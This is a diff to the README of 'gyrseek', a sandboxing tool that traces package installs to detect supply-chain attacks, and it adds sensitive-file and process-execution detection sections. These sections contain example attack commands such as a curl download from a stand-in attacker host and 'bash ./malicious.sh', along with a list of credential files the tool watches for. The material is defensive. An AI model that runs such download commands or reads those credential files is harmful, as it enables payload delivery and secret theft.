@@ -21,8 +21,9 @@ If nothing suspicious is found, your original command is forwarded and runs norm
 - [How It Works](#how-it-works)
   - [Network Behavior Detection](#network-behavior-detection)
   - [Git Clone Behavior Detection](#git-clone-behavior-detection)
-  - [Process-Execution Detection](#process-execution-detection)
-  - [Post-Install Artifact Detection](#post-install-artifact-detection)
+  - [Process-Execution Behavior Detection](#process-execution-behavior-detection)
+  - [Sensitive File Access Behavior Detection](#sensitive-file-access-behavior-detection)
+  - [Post-Install Artifact Behavior Detection](#post-install-artifact-behavior-detection)
 - [Package Related Supply Chain Attack Detection Coverage](#package-related-supply-chain-attack-detection-coverage)
 - [Configuration](#configuration)
 - [Sandbox Modes](#sandbox-modes)
@@ -201,14 +202,19 @@ cargo run npm install lodash
    - **Network**: endpoints contacted during install (see [Network Behavior Detection](#network-behavior-detection)).
    - **Git clone**: install-time `git clone` command signatures (see [Git Clone Behavior Detection](#git-clone-behavior-detection)).
    - **Process execution**: all programs executed during install — the payload's own commands plus the sandbox's internal setup (see [Process-Execution Detection](#process-execution-detection)).
+   - **Sensitive files**: attempts to read sensitive credentials or configuration files (see [Sensitive File Access Behavior Detection](#sensitive-file-access-behavior-detection)).
    - **Artifacts**: post-install file inventory of every installed file — binary executables, suspicious `.pth` files, unexpected runtimes, and large files (see [Post-Install Artifact Detection](#post-install-artifact-detection)).
 5. **Decide**:
-   - New endpoint, clone behavior, process execution, or artifact finding found → **block and exit non-zero**.
+   - If one or more behavioral anomalies are found (e.g., new endpoint, clone behavior, process execution, sensitive file read, or artifact finding) → **all findings are aggregated, reported together, and the install is blocked (exits non-zero)**. It does not short-circuit on the first failure.
    - Nothing new → **forward your original command**.
 6. **Fail closed**: if a package target was expected but couldn't be detected — _or if the sandbox produced no trace at all_ (e.g. `strace` could not attach) — `gyrseek` blocks rather than letting the command through. A blank trace is never treated as a clean, zero-activity install. New artifact findings across versions also fail closed.
 7. **Propagate the host exit code**: when the original command is forwarded, `gyrseek` exits with the package manager's own status. A failed install (non-zero) surfaces as non-zero, so agents and CI `$?` checks are not misled into thinking a broken install succeeded.
 
 This gives you a _behavioral_ signal, rather than relying only on package metadata.
+
+> **Transitive Dependencies:** `gyrseek` natively covers transitive dependencies in two ways:
+> 1. **Explicit single-package installs** (e.g., `npm install express`): The sandbox runs the complete package manager install process. Because `strace` monitors the entire process tree, any network connections or process executions triggered by a transitive dependency's install scripts are captured in the trace. If a transitive dependency introduces new malicious behavior not present in the top-level package's baseline, the install is blocked.
+> 2. **Lockfile and bulk syncs** (e.g., `uv sync`, `poetry install`, `npm install`): `gyrseek` parses the lockfile or manifest directly. It extracts every package in the dependency tree—including all transitive dependencies—and runs isolated sandbox tests for each one against its own historical baselines before proceeding.
 
 > **PEP 508 extras** (e.g. `requests[security]`) are handled correctly: the extras are stripped for registry lookups and version-pin bookkeeping (so the PyPI lookup hits `requests`, not a 404), while the forwarded install command keeps the full `requests[security]==<scanned version>` spec.
 
@@ -225,6 +231,7 @@ This gives you a _behavioral_ signal, rather than relying only on package metada
 - New IPs are **always** treated as anomalies (fail-closed), unless the IP's FCrDNS resolves to a domain already seen in baseline traffic — in which case it is silently discarded as a benign CDN edge rotation.
 - Domain-aware IP diff resolves each IP via FCrDNS and compares at the domain level, not the IP level. If a current IP resolves to a domain already seen in baseline traffic (e.g. a rotated Fastly edge IP for `files.pythonhosted.org`), it is silently discarded — no hardcoded domain list needed. This handles benign CDN edge rotations for any infrastructure automatically. Unresolvable IPs fall back to plain IP membership so the diff stays fail-closed for genuinely new or spoofed endpoints.
 - The `domain_allowlist` uses **forward-confirmed reverse DNS (FCrDNS)**: a PTR hostname is only trusted if it resolves _forward_ back to the original IP. An attacker who sets their C2 server's PTR record to an allowlisted domain cannot bypass the allowlist, because the allowlisted domain's real A/AAAA record does not point back at the C2 IP.
+- **Environment variables:** Because reading an environment variable (e.g. `process.env.AWS_KEY`) does not make a system call, it is invisible to `strace`. However, `gyrseek` does not need to see the read. If a package reads a secret and attempts to exfiltrate it over the network, the **Network Behavior Detection** flags the new connection to the attacker's IP/domain and kills the install. Exfiltration is caught at the network boundary, regardless of how the payload encrypts or hides the secret in transit.
 
 Example — abnormal network behavior detected:
 
@@ -256,19 +263,31 @@ git clone simulation contacted new endpoints not seen in baseline clone behavior
 Aborting host operation securely.
 ```
 
-### Process-Execution Detection
+### Process-Execution Behavior Detection
 
-Some supply-chain attacks don't assume a runtime is present — they **download one and use it to run the payload**. The Shai-Hulud "Hades/miasma" PyPI wave downloads the **Bun** JavaScript runtime during install/startup and runs an obfuscated stealer with `bun run _index.js`.
+`gyrseek` takes a least-privilege approach to program execution during installation. Any process a package runs that it didn't run in previous versions is treated as suspect.
 
-`gyrseek` captures **every** `execve` system call during the sandbox install (all executables, not just a curated list), diffs the resulting signatures against baseline versions, and fails closed if new or changed process execution appears. This is a least-privilege approach — any process the package runs that it didn't run before is suspect.
+#### How it works
+It captures **every** `execve` system call inside the sandbox, extracts the executable name and its exact arguments to form a signature, and diffs them against baseline versions. If a new or changed process execution appears, it fails closed.
 
-The sandbox's own install commands (`uv pip install`, `npm install`, `pnpm add`, and the associated interpreter-discovery subprocesses) are automatically filtered out so version-specific command strings do not cause false positives. Only the package's own behavior — including downloaded runtimes, build scripts, or postinstall hooks — contributes to the diff.
+#### Common Attack Patterns Caught
+- **Download-and-Execute (Bun/Deno):** Many attacks don't assume a malicious runtime is present — they download one. For example, the Shai-Hulud "Hades/miasma" PyPI wave downloads the Bun JavaScript runtime and runs an obfuscated stealer via `bun run _index.js`.
+- **System Utilities & Shell Scripts (`curl`, `wget`, `bash`, `sh`):** If a package uses `curl` or `wget` to download a payload (e.g., `curl http://attacker.com/payload.sh`), or executes a shell script (e.g., `bash ./malicious.sh` or `sh -c "echo payload"`), the exact executable and its arguments are captured as a signature (like `curl|-O|http://attacker.com/payload.sh` or `bash|./malicious.sh`). Any newly introduced utility/script execution, or an existing utility with new/changed arguments, is flagged. *(Note: The network connection made by `curl` or `wget` is independently caught by the Network Behavior Detection).*
 
-Tune this with the `process_exec_allowlist` config key (see [Configuration](#configuration)).
+#### Reducing Noise
+- **Harness Exclusion:** The sandbox's own install commands (e.g., `uv pip install`, `npm install`) and interpreter-discovery subprocesses are automatically filtered out. Only the package's own behavior contributes to the diff.
+- **Allowlisting:** Expected new behavior can be explicitly permitted using the `process_exec_allowlist` config key (see [Configuration](#configuration)).
 
-> **Scope:** this observes processes executed _inside the sandbox during install_ (where the Bun loader fires for npm-style hooks and where Python install-time execution can occur). The PyPI `*-setup.pth` variant that triggers on the _next interpreter startup_ rather than at install time may execute outside the install window, though the post-install artifact scan catches the `.pth` file itself during install (see [Post-Install Artifact Detection](#post-install-artifact-detection)).
+> **Scope Limitation:** This observes processes executed _inside the sandbox during install_ (e.g., npm `preinstall`/`postinstall` hooks or Python `setup.py` execution). Attacks that defer execution to the _next interpreter startup_ (like the PyPI `*-setup.pth` variant) execute outside this window. However, Gyrseek's post-install artifact scan catches the `.pth` file itself before the install finishes (see [Post-Install Artifact Detection](#post-install-artifact-detection)).
 
-### Post-Install Artifact Detection
+### Sensitive File Access Behavior Detection
+
+`gyrseek` traces `open` and `openat` system calls to actively monitor for credential and configuration theft attempts. While checking environmental variables directly is not possible due to `strace` limitations, monitoring sensitive file access provides a robust defense against exfiltration techniques.
+
+#### How it works
+If an installation script unexpectedly reads highly sensitive files (e.g., `~/.aws/credentials`, `~/.ssh/id_rsa`, `~/.npmrc`, `~/.env`, `/etc/passwd`), `gyrseek` captures the hex-escaped path via `strace` and unescapes it for analysis. The accessed files are then diffed against baseline versions. If a new package version accesses sensitive files that older versions never touched, the install is immediately blocked.
+
+### Post-Install Artifact Behavior Detection
 
 `gyrseek` runs a comprehensive file inventory inside the Docker container **after each install probe**, recording every installed file (path, size, file type, first 300 bytes of content). Classification happens on the Rust side, so new IOC patterns are detected without container script changes.
 
@@ -429,8 +448,12 @@ minimum_release_age_package: 3
 release_burst_threshold: 3
 release_burst_window_hours: 24
 process_exec_allowlist:
+  - bun|run|testing.js
   - bun|run|build
   - deno
+sensitive_file_access_allowlist:
+  - .env
+  - .aws/credentials
 ```
 
 ### Config loading behavior
@@ -674,7 +697,7 @@ Tests follow Rust convention — inline in their module under `#[cfg(test)]`, on
 - `docs/ARCHITECTURE.md` — control-flow and component map
 - `docs/DEV_GUIDE.md` — contributor workflow and change hygiene
 - `docs/ROADMAP.md` — planned improvements and next steps
-- `docs/FINDINGS.md` — security and correctness findings log (static review findings and their fixes)
+- `docs/OPEN_FINDINGS.md`, `docs/FIXED_FINDINGS.md`, `docs/WONT_FIX_FINDINGS.md` — security and correctness findings logs
 - `docs/DOCKER_SECURITY.md` — Docker sandbox security reference (seccomp, AppArmor, capabilities, validation)
 - `AGENTS.md` — repository memory and mandatory update policy
 
